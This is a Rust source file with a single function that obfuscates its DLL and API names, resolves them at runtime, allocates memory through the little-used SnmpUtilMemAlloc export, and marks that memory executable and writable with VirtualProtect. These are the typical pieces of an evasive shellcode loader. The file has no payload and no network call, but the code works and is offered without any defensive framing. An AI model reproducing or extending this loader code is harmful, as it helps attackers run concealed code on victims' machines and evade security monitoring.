use crate::utils::{load_library, get_proc_address};
#[allow(dead_code)]
pub unsafe fn alloc_mem(size: usize) -> Result<*mut u8, String> {
    use obfstr::{obfstr, obfbytes};
    use core::ffi::c_void;

    type SnmpUtilMemAllocFn = unsafe extern "system" fn(n_bytes: u32) -> *mut c_void;
    type VirtualProtectFn = unsafe extern "system" fn(lp_address: *mut c_void, dw_size: usize, fl_new_protect: u32, lpfl_old_protect: *mut u32) -> i32;

    let snmpapi = load_library(obfbytes!(b"snmpapi.dll\0").as_slice())?;
    let kernel32 = load_library(obfbytes!(b"kernel32.dll\0").as_slice())?;
    
    let snmp_alloc: SnmpUtilMemAllocFn = core::mem::transmute(get_proc_address(snmpapi, obfbytes!(b"SnmpUtilMemAlloc\0").as_slice())?);
    let virtual_protect: VirtualProtectFn = core::mem::transmute(get_proc_address(kernel32, obfbytes!(b"VirtualProtect\0").as_slice())?);

    let p = snmp_alloc(size as u32);
    if p.is_null() {
        return Err(obfstr!("SnmpUtilMemAlloc failed").to_string());
    }

    let mut old_protect = 0u32;
    let ok = virtual_protect(p, size, 0x40, &mut old_protect);
    if ok == 0 {
        return Err(obfstr!("VirtualProtect failed").to_string());
    }

    Ok(p as *mut u8)
}